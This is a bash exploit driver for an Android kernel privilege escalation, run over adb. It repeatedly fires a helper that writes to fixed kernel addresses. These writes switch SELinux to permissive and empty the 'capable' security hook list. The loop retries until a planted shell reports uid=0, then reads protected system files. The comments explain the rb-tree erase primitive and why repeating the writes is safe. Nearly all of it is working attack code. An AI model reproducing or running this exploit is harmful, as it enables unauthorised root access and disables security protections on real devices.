#!/usr/bin/env bash
# Drive the two-store escalation to root in ONE boot, retrying each store until
# its own oracle flips.
#
#   store 1: *(c1d5a720) = 0   -> selinux_state.enforcing off  (oracle: getenforce)
#   store 2: *(c17ab57c) = 0   -> security_hook_heads.capable emptied
#                                (oracle: /data/local/tmp/rootsh prints uid=0)
#
# Landing is probabilistic: the erase only runs when the live init_task->pi_waiters
# chain actually reaches our ghost waiter, so a fire emits several identical
# stores and the loop re-fires until the oracle changes. V=0 stores carry no
# collateral write and (W-4) is even, so rb_erase returns straight after the one
# store -- repeating them cannot corrupt anything beyond the intended word.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
cd "$(dirname "$0")" || exit 1

fire() { # <label> <plist>
  bash atd_fire.sh "$1" GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_WS_TARGET=st \
    GHOSTLOCK_WBASE=4 GHOSTLOCK_ATTEMPTS=9 \
    GHOSTLOCK_STAT_PLIST="$2" >>/tmp/rootloop.log 2>&1
}
enf() { $ADB shell getenforce 2>/dev/null | tr -d '\r'; }

REPEATS="c1d5a720=0,c1d5a720=0,c1d5a720=0,c1d5a720=0,c1d5a720=0,@c1d5a720=0"
CAPREPEATS="c17ab57c=0,c17ab57c=0,c17ab57c=0,c17ab57c=0,c17ab57c=0,@c17ab57c=0"

echo "=== phase 1: permissive ===" | tee -a /tmp/rootloop.log
for i in 1 2 3 4; do
  s=$(enf)
  echo "[try $i] getenforce=$s" | tee -a /tmp/rootloop.log
  [ "$s" = "Permissive" ] && break
  fire "p$i" "$REPEATS"
done
if [ "$(enf)" != "Permissive" ]; then
  echo "RESULT: could not reach permissive" | tee -a /tmp/rootloop.log
  exit 1
fi

echo "=== phase 2: empty the capable hook list ===" | tee -a /tmp/rootloop.log
for i in 1 2 3 4; do
  fire "q$i" "$CAPREPEATS"
  out=$($ADB shell "chmod 0755 $DT/rootsh; $DT/rootsh id" 2>/dev/null | tr -d '\r')
  echo "[try $i] rootsh: $out" | tee -a /tmp/rootloop.log
  case "$out" in
    *uid=0*)
      echo "RESULT: ROOT (uid=0) achieved" | tee -a /tmp/rootloop.log
      $ADB shell "getenforce; id; ls -l /data/system/packages.xml;
                  cat /proc/1/status | sed -n '9,12p'" 2>/dev/null | tr -d '\r' \
        | tee -a /tmp/rootloop.log
      exit 0 ;;
  esac
done
echo "RESULT: still not root" | tee -a /tmp/rootloop.log
exit 1
